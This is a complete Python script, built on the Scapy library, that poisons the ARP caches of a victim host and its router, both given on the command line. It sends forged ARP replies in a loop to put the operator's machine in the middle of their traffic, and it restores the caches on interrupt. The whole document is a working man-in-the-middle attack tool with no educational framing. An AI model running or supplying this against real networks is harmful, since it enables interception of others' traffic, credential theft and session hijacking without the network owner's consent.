#!/usr/bin/env python3
from scapy.all import *
import sys, os, time

#use your interface
conf.iface = "eth0"

def arp_spoof(dest_ip, dest_mac, source_ip):
    packet = ARP(op="is-at",
                 psrc=source_ip, pdst=dest_ip,
                 hwsrc=get_if_hwaddr(conf.iface), hwdst=dest_mac)
    send(packet, verbose=False)

def arp_restore(dest_ip, dest_mac, source_ip, source_mac):
    packet = ARP(op="is-at",
                 psrc=source_ip, pdst=dest_ip,
                 hwsrc=source_mac, hwdst=dest_mac)
    send(packet, verbose=False)

def main():
    if os.geteuid() != 0:
        print("Esegui come root (sudo)."); sys.exit(1)

    victim_ip = sys.argv[1]
    router_ip = sys.argv[2]

    victim_mac = getmacbyip(victim_ip)
    router_mac = getmacbyip(router_ip)

    try:
        print("Sending spoofed ARP packets")
        while True:
            arp_spoof(victim_ip, victim_mac, router_ip)
            arp_spoof(router_ip, router_mac, victim_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("Restoring ARP Tables")
        arp_restore(router_ip, router_mac, victim_ip, victim_mac)
        arp_restore(victim_ip, victim_mac, router_ip, router_mac)
        quit()

main()
